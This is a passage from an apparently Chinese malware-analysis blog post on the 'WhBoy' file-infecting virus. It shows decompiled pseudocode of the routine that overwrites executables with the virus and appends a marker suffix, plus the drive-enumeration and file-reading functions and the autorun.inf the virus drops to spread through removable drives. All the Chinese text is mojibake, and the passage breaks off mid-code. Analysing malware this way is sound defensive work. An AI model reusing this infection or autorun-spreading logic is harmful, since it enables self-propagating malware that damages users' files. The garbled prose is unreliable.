src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20251002182511.png"></p><p>åˆ†ææ„ŸæŸ“è¡Œä¸ºï¼Œåœ¨è¢«æ„ŸæŸ“ç¨‹åºå‰æ’å…¥æºç—…æ¯’ï¼Œæ–‡ä»¶å°¾åŠ ä¸Šç‰¹å¾åç¼€â€whboyâ€+è¢«æ„ŸæŸ“ç¨‹åºåŸåç§°+â€.exeâ€+â€\x02â€+æ–‡ä»¶å¤§å°+â€œ\x01â€</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __usercall sub_407F00@&lt;eax&gt;(<span class="hljs-type">int</span> a1@&lt;eax&gt;, <span class="hljs-type">int</span> Buffer@&lt;ebx&gt;, <span class="hljs-type">int</span> Servername@&lt;edi&gt;, <span class="hljs-type">int</span> a4@&lt;esi&gt;)<br>&#123;<br>  <span class="hljs-type">char</span> v4; <span class="hljs-comment">// zf</span><br>  <span class="hljs-type">const</span> CHAR *lpFileName; <span class="hljs-comment">// ebx</span><br>  <span class="hljs-type">const</span> CHAR *lpExistingFileName; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> v7; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> v8; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> v9; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> v10; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> v11; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> v12; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> v13; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v15[<span class="hljs-number">3</span>]; <span class="hljs-comment">// [esp-18h] [ebp-214h] BYREF</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v16[<span class="hljs-number">2</span>]; <span class="hljs-comment">// [esp-Ch] [ebp-208h] BYREF</span><br>  <span class="hljs-type">int</span> *v17; <span class="hljs-comment">// [esp-4h] [ebp-200h]</span><br>  <span class="hljs-type">int</span> v18; <span class="hljs-comment">// [esp+Ch] [ebp-1F0h] BYREF</span><br>  <span class="hljs-type">int</span> v19; <span class="hljs-comment">// [esp+10h] [ebp-1ECh] BYREF</span><br>  <span class="hljs-type">int</span> v20; <span class="hljs-comment">// [esp+14h] [ebp-1E8h]</span><br>  <span class="hljs-type">int</span> v21; <span class="hljs-comment">// [esp+18h] [ebp-1E4h]</span><br>  <span class="hljs-type">int</span> v22; <span class="hljs-comment">// [esp+1Ch] [ebp-1E0h] BYREF</span><br>  _BYTE v23[<span class="hljs-number">460</span>]; <span class="hljs-comment">// [esp+20h] [ebp-1DCh] BYREF</span><br>  <span class="hljs-type">int</span> v24; <span class="hljs-comment">// [esp+1ECh] [ebp-10h] BYREF</span><br>  <span class="hljs-type">int</span> v25; <span class="hljs-comment">// [esp+1F0h] [ebp-Ch] BYREF</span><br>  _BYTE *v26; <span class="hljs-comment">// [esp+1F4h] [ebp-8h] BYREF</span><br>  <span class="hljs-type">int</span> v27; <span class="hljs-comment">// [esp+1F8h] [ebp-4h]</span><br>  <span class="hljs-type">int</span> savedregs; <span class="hljs-comment">// [esp+1FCh] [ebp+0h] BYREF</span><br><br>  v19 = <span class="hljs-number">0</span>;<br>  v18 = <span class="hljs-number">0</span>;<br>  v20 = <span class="hljs-number">0</span>;<br>  v21 = <span class="hljs-number">0</span>;<br>  v22 = <span class="hljs-number">0</span>;<br>  v26 = <span class="hljs-number">0</span>;<br>  v25 = <span class="hljs-number">0</span>;<br>  v24 = <span class="hljs-number">0</span>;<br>  v27 = a1;<br>  System::__linkproc__ <span class="hljs-title function_">LStrAddRef</span><span class="hljs-params">(a1)</span>;<br>  v17 = &amp;savedregs;<br>  v16[<span class="hljs-number">1</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)&amp;loc_408145;<br>  v16[<span class="hljs-number">0</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)NtCurrentTeb()-&gt;NtTib.ExceptionList;<br>  __writefsdword(<span class="hljs-number">0</span>, (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)v16);<br>  v15[<span class="hljs-number">2</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)&amp;savedregs;<br>  v15[<span class="hljs-number">1</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)&amp;loc_408110;<br>  v15[<span class="hljs-number">0</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)NtCurrentTeb()-&gt;NtTib.ExceptionList;<br>  __writefsdword(<span class="hljs-number">0</span>, (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)v15);<br>  sub_405534(v27, &amp;v22);                        <span class="hljs-comment">// è¯»å–ç›®æ ‡ç¨‹åºæ–‡ä»¶å</span><br>  <span class="hljs-keyword">if</span> ( !(<span class="hljs-type">unsigned</span> __int8)sub_4077B4(v22) )<br>  &#123;<br>    System::Randomize();<br>    System::ParamStr(<span class="hljs-number">0</span>);                        <span class="hljs-comment">// è·å–æºç—…æ¯’ç¨‹åºè·¯å¾„</span><br>    System::__linkproc__ <span class="hljs-title function_">LStrCmp</span><span class="hljs-params">(v27, v21)</span>;     <span class="hljs-comment">// æ¯”è¾ƒï¼Œè‹¥ä¸ç›¸ç­‰</span><br>    <span class="hljs-keyword">if</span> ( !v4 )<br>    &#123;<br>      System::__linkproc__ <span class="hljs-title function_">LStrClr</span><span class="hljs-params">(&amp;v26)</span>;<br>      sub_407650(v27, (<span class="hljs-type">int</span> *)&amp;v26, Buffer, Servername, a4);<span class="hljs-comment">// è¯»å–è¦æ„ŸæŸ“çš„æ–‡ä»¶å†…å®¹åˆ°å†…å­˜ä¸­</span><br>      <span class="hljs-keyword">if</span> ( v26 )<br>      &#123;<br>        <span class="hljs-keyword">if</span> ( (<span class="hljs-type">int</span>)__linkproc__ LStrPos(<br>                    aWhboy,                     <span class="hljs-comment">// &quot;WhBoy&quot;</span><br>                    v26) &lt;= <span class="hljs-number">0</span> )<br>        &#123;<br>          lpFileName = (<span class="hljs-type">const</span> CHAR *)System::__linkproc__ LStrToPChar(v27);<br>          SetFileAttributesA(lpFileName, <span class="hljs-number">0x80</span>u);<span class="hljs-comment">// è®¾ç½®æ–‡ä»¶å±æ€§ä¸ºæ­£å¸¸</span><br>          Sleep(<span class="hljs-number">1u</span>);<br>          System::ParamStr(<span class="hljs-number">0</span>);<br>          lpExistingFileName = (<span class="hljs-type">const</span> CHAR *)System::__linkproc__ LStrToPChar(v20);<br>          <span class="hljs-keyword">if</span> ( CopyFileA(lpExistingFileName, lpFileName, <span class="hljs-number">0</span>) )<span class="hljs-comment">// æŠŠæºç—…æ¯’ç¨‹åºå¤åˆ¶ç»™ç›®æ ‡ç¨‹åºï¼Œæ­¤æ—¶å®Œæˆæ„ŸæŸ“</span><br>          &#123;<br>            sub_405534(v27, &amp;v19);<br>            v7 = unknown_libname_113((<span class="hljs-type">int</span>)v26);<br>            sub_40576C(v7, (<span class="hljs-type">int</span>)&amp;v18);<br>            System::__linkproc__ <span class="hljs-title function_">LStrCatN</span><span class="hljs-params">(&amp;v24, <span class="hljs-number">6</span>)</span>;<br>            System::__linkproc__ <span class="hljs-title function_">LStrLAsg</span><span class="hljs-params">(&amp;v25, v26)</span>;<br>            System::__linkproc__ <span class="hljs-title function_">Assign</span><span class="hljs-params">(v23, v27)</span>;<br>            *off_40E2BC = <span class="hljs-number">2</span>;<br>            v8 = System::__linkproc__ Append(v23);<br>            System::__linkproc__ _IOTest(v8);<br>            v9 = System::__linkproc__ WriteLString((<span class="hljs-type">int</span>)v23, v25);<span class="hljs-comment">// æŠŠæºæ–‡ä»¶å†…å®¹æ¥ç€å†™åˆ°è¢«æ„ŸæŸ“æ–‡ä»¶çš„åé¢</span><br>            v10 = System::__linkproc__ Flush(v9);<br>            System::__linkproc__ _IOTest(v10);<br>            v11 = System::__linkproc__ WriteLString((<span class="hljs-type">int</span>)v23, v24);<span class="hljs-comment">// å†™å…¥åç¼€ï¼Œæ ¼å¼ä¸º&quot;whboy&quot;+è¢«æ„ŸæŸ“ç¨‹åºåŸåç§°+&quot;.exe&quot;+&quot;\x02&quot;+æ–‡ä»¶å¤§å°+â€œ\x01&quot;</span><br>            v12 = System::__linkproc__ Flush(v11);<br>            System::__linkproc__ _IOTest(v12);<br>            v13 = System::__linkproc__ Close(v23);<br>            System::__linkproc__ _IOTest(v13);<br>          &#125;<br>        &#125;<br>      &#125;<br>    &#125;<br>  &#125;<br>  __writefsdword(<span class="hljs-number">0</span>, v15[<span class="hljs-number">0</span>]);<br>  __writefsdword(<span class="hljs-number">0</span>, v16[<span class="hljs-number">0</span>]);<br>  System::__linkproc__ <span class="hljs-title function_">LStrArrayClr</span><span class="hljs-params">(&amp;loc_40814C)</span>;<br>  <span class="hljs-keyword">return</span> System::__linkproc__ LStrArrayClr(v17);<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20251002182155.png"></p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20251002183135.png"></p><h3 id="sub-40c374"><a href="#sub-40c374" class="headerlink" title="sub_40c374"></a>sub_40c374</h3><p>è®¾ç½®äº†ä¸€ä¸ªå®šæ—¶å™¨ï¼Œç‚¹è¿›å»çœ‹çœ‹</p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20251002084452.png"></p><h4 id="sub-40bc88"><a href="#sub-40bc88" class="headerlink" title="sub_40bc88"></a>sub_40bc88</h4><p>æœ¬å‡½æ•°çš„åŠŸèƒ½ä¸ºéå†ç›˜ç¬¦ï¼Œè·å–å¯ç”¨çš„ï¼Œæ•…é‡å‘½åä¸ºGetRootPath</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __usercall GetRootPath@&lt;eax&gt;(<br>        <span class="hljs-type">int</span> a1@&lt;eax&gt;,<br>        <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> a2@&lt;ebx&gt;,<br>        <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> a3@&lt;edi&gt;,<br>        <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> lpFileName@&lt;esi&gt;)<br>&#123;<br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// esi</span><br>  <span class="hljs-type">const</span> CHAR *lpRootPathName; <span class="hljs-comment">// eax</span><br>  __int16 DriveTypeA; <span class="hljs-comment">// ax</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v9[<span class="hljs-number">6</span>]; <span class="hljs-comment">// [esp-18h] [ebp-24h] BYREF</span><br>  <span class="hljs-type">int</span> v10; <span class="hljs-comment">// [esp+0h] [ebp-Ch] BYREF</span><br>  <span class="hljs-type">int</span> v11; <span class="hljs-comment">// [esp+4h] [ebp-8h] BYREF</span><br>  <span class="hljs-type">int</span> v12; <span class="hljs-comment">// [esp+8h] [ebp-4h] BYREF</span><br>  <span class="hljs-type">int</span> savedregs; <span class="hljs-comment">// [esp+Ch] [ebp+0h] BYREF</span><br><br>  v12 = <span class="hljs-number">0</span>;<br>  v11 = <span class="hljs-number">0</span>;<br>  v10 = <span class="hljs-number">0</span>;<br>  v9[<span class="hljs-number">5</span>] = a2;<br>  v9[<span class="hljs-number">4</span>] = lpFileName;<br>  v9[<span class="hljs-number">3</span>] = a3;<br>  v9[<span class="hljs-number">2</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)&amp;savedregs;<br>  v9[<span class="hljs-number">1</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)&amp;loc_40BD18;<br>  v9[<span class="hljs-number">0</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)NtCurrentTeb()-&gt;NtTib.ExceptionList;<br>  __writefsdword(<span class="hljs-number">0</span>, (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)v9);<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i != <span class="hljs-number">26</span>; ++i )                   <span class="hljs-comment">// éå†ç›˜ç¬¦A-Z</span><br>  &#123;<br>    unknown_libname_108((<span class="hljs-type">int</span>)&amp;v11);<br>    System::__linkproc__ <span class="hljs-title function_">LStrCat3</span><span class="hljs-params">(&amp;v12, v11, sub_40BD30)</span>;<br>    lpRootPathName = (<span class="hljs-type">const</span> CHAR *)System::__linkproc__ LStrToPChar(v12);<br>    DriveTypeA = GetDriveTypeA(lpRootPathName); <span class="hljs-comment">// è·å–ç›˜ç¬¦å±æ€§</span><br>    <span class="hljs-keyword">if</span> ( DriveTypeA == <span class="hljs-number">3</span> || DriveTypeA == <span class="hljs-number">4</span> || DriveTypeA == <span class="hljs-number">2</span> )<span class="hljs-comment">// DriveTypeA == 3 || DriveTypeA == 4 || DriveTypeA == 2ï¼ˆå³ DRIVE_FIXEDã€DRIVE_REMOTEã€DRIVE_REMOVABLEï¼‰</span><br>                                                <span class="hljs-comment">// ç›˜ç¬¦å±æ€§ç¬¦åˆåˆ™è®°å½•</span><br>    &#123;<br>      unknown_libname_108((<span class="hljs-type">int</span>)&amp;v10);<br>      System::__linkproc__ <span class="hljs-title function_">LStrCat</span><span class="hljs-params">(a1, v10)</span>;<br>    &#125;<br>  &#125;<br>  __writefsdword(<span class="hljs-number">0</span>, v9[<span class="hljs-number">0</span>]);<br>  <span class="hljs-keyword">return</span> System::__linkproc__ LStrArrayClr(&amp;loc_40BD1F);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="sub-40bd34"><a href="#sub-40bd34" class="headerlink" title="sub_40bd34"></a>sub_40bd34</h4><p>æ­¤å‡½æ•°çš„ä½œç”¨æ˜¯æ‰“å¼€æ–‡ä»¶å¹¶è¯»å–è¿›ç¨‹åºå†…å­˜ï¼Œæ•…é‡å‘½åä¸ºOpenAndRead_File</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __usercall OpenAndRead_File@&lt;eax&gt;(<br>        <span class="hljs-type">int</span> System::AnsiString@&lt;eax&gt;,<br>        <span class="hljs-type">int</span> *a2@&lt;edx&gt;,<br>        <span class="hljs-type">int</span> __strlen@&lt;ebx&gt;,<br>        <span class="hljs-type">int</span> a4@&lt;edi&gt;,<br>        <span class="hljs-type">int</span> lpFileName@&lt;esi&gt;)<br>&#123;<br>  <span class="hljs-type">int</span> v6; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> v7; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> v8; <span class="hljs-comment">// esi</span><br>  <span class="hljs-type">int</span> v9; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> v10; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> v11; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v13[<span class="hljs-number">3</span>]; <span class="hljs-comment">// [esp-24h] [ebp-517Ch] BYREF</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v14[<span class="hljs-number">2</span>]; <span class="hljs-comment">// [esp-18h] [ebp-5170h] BYREF</span><br>  <span class="hljs-type">int</span> *v15; <span class="hljs-comment">// [esp-10h] [ebp-5168h]</span><br>  <span class="hljs-type">int</span> v16; <span class="hljs-comment">// [esp-Ch] [ebp-5164h]</span><br>  <span class="hljs-type">int</span> lpFileName_1; <span class="hljs-comment">// [esp-8h] [ebp-5160h]</span><br>  <span class="hljs-type">int</span> __strlen_1; <span class="hljs-comment">// [esp-4h] [ebp-515Ch]</span><br>  <span class="hljs-type">int</span> v19; <span class="hljs-comment">// [esp+0h] [ebp-5158h] BYREF</span><br>  _BYTE v20[<span class="hljs-number">20480</span>]; <span class="hljs-comment">// [esp+4h] [ebp-5154h] BYREF</span><br>  _BYTE v21[<span class="hljs-number">332</span>]; <span class="hljs-comment">// [esp+5004h] [ebp-154h] BYREF</span><br>  _BYTE v22[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [esp+5150h] [ebp-8h] BYREF</span><br>  <span class="hljs-type">int</span> System::AnsiString_1; <span class="hljs-comment">// [esp+5154h] [ebp-4h] BYREF</span><br>  <span class="hljs-type">int</span> savedregs; <span class="hljs-comment">// [esp+5158h] [ebp+0h] BYREF</span><br><br>  __strlen_1 = __strlen;<br>  lpFileName_1 = lpFileName;<br>  v16 = a4;<br>  v19 = <span class="hljs-number">0</span>;<br>  System::AnsiString_1 = System::AnsiString;<br>  System::__linkproc__ <span class="hljs-title function_">LStrAddRef</span><span class="hljs-params">(System::AnsiString)</span>;<br>  v15 = &amp;savedregs;<br>  v14[<span class="hljs-number">1</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)&amp;loc_40BE6D;<br>  v14[<span class="hljs-number">0</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)NtCurrentTeb()-&gt;NtTib.ExceptionList;<br>  __writefsdword(<span class="hljs-number">0</span>, (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)v14);<br>  v13[<span class="hljs-number">2</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)&amp;savedregs;<br>  v13[<span class="hljs-number">1</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)&amp;loc_40BE42;<br>  v13[<span class="hljs-number">0</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)NtCurrentTeb()-&gt;NtTib.ExceptionList;<br>  __writefsdword(<span class="hljs-number">0</span>, (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)v13);<br>  System::__linkproc__ <span class="hljs-title function_">LStrClr</span><span class="hljs-params">(a2)</span>;<br>  System::__linkproc__ <span class="hljs-title function_">Assign</span><span class="hljs-params">(v21, System::AnsiString_1)</span>;<br>  *off_40E2BC = <span class="hljs-number">0</span>;<br>  v6 = System::__linkproc__ ResetFile(v21, <span class="hljs-number">1</span>);<br>  System::__linkproc__ _IOTest(v6);<br>  v7 = System::__linkproc__ FileSize(v21);<br>  v8 = System::__linkproc__ _IOTest(v7);<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    v10 = System::__linkproc__ EofFile(v21);<br>    <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> __int8)System::__linkproc__ _IOTest(v10) )<br>      <span class="hljs-keyword">break</span>;<br>    v9 = System::__linkproc__ BlockRead(v22);<br>    System::__linkproc__ _IOTest(v9);<br>    System::__linkproc__ <span class="hljs-title function_">LStrFromPCharLen</span><span class="hljs-params">(&amp;v19, v20, <span class="hljs-number">20480</span>)</span>;<br>    System::__linkproc__ <span class="hljs-title function_">LStrCat</span><span class="hljs-params">(a2, v19)</span>;<br>  &#125;<br>  v11 = System::__linkproc__ Close(v21);<br>  System::__linkproc__ _IOTest(v11);<br>  <span class="hljs-keyword">if</span> ( v8 &lt; unknown_libname_113(*a2) )<br>    System::__linkproc__ <span class="hljs-title function_">LStrCopy</span><span class="hljs-params">(a2)</span>;<br>  __writefsdword(<span class="hljs-number">0</span>, v13[<span class="hljs-number">0</span>]);<br>  __writefsdword(<span class="hljs-number">0</span>, v14[<span class="hljs-number">0</span>]);<br>  v15 = (<span class="hljs-type">int</span> *)&amp;loc_40BE74;<br>  System::__linkproc__ <span class="hljs-title function_">LStrClr</span><span class="hljs-params">(&amp;v19)</span>;<br>  <span class="hljs-keyword">return</span> System::__linkproc__ LStrClr(&amp;System::AnsiString_1);<br>&#125;<br></code></pre></td></tr></table></figure><p>å…·ä½“è¡Œä¸ºå°±æ˜¯åœ¨ç›˜ç¬¦æ ¹ç›®å½•ï¼ˆä¸åŒ…æ‹¬Aã€Bç›˜ç¬¦ï¼‰åˆ›å»ºsetup.exeä»¥åŠautorun.inf</p><p>setup.exeå†…å®¹å’Œç—…æ¯’æºæ–‡ä»¶ç›¸åŒ</p><p>autorun.infå†…å®¹ä¸ºï¼Œç›®çš„æ˜¯åœ¨æ’å…¥åª’ä»‹ï¼ˆé€šå¸¸æ˜¯å…‰ç›˜æˆ–æ›¾è¢«åˆ©ç”¨çš„ U ç›˜ï¼‰æ—¶æç¤ºæˆ–å°è¯•è‡ªåŠ¨è¿è¡ŒåŒç›®å½•ä¸‹çš„ <code>setup.exe</code></p><p>æ¨æµ‹ä¸ºæ„ŸæŸ“å¯ç§»åŠ¨ä»‹è´¨çš„æ‰‹æ®µ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plain">[AutoRun]<br>OPEN=setup.exe<br>shellexecute=setup.exe<br>shell\Auto\command=setup.exe<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><code class="hljs c">v26 = &amp;savedregs;<br>  v25[<span class="hljs-number">1</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)&amp;loc_40C2C6;<br>  v25[<span class="hljs-number">0</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)NtCurrentTeb()-&gt;NtTib.ExceptionList;<br>  __writefsdword(<span class="hljs-number">0</span>, (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)v25);<br>  v24[<span class="hljs-number">2</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)&amp;savedregs;<br>  v24[<span class="hljs-number">1</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)&amp;loc_40C291;<br>  v24[<span class="hljs-number">0</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)NtCurrentTeb()-&gt;NtTib.ExceptionList;<br>  __writefsdword(<span class="hljs-number">0</span>, (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)v24);         <span class="hljs-comment">// SEHè®¾ç½®å®Œæˆ</span><br>  System::__linkproc__ <span class="hljs-title function_">LStrClr</span><span class="hljs-params">(&amp;v40)</span>;<br>  System::__linkproc__ <span class="hljs-title function_">LStrClr</span><span class="hljs-params">(&amp;System::AnsiString)</span>;<br>  System::__linkproc__ <span class="hljs-title function_">LStrClr</span><span 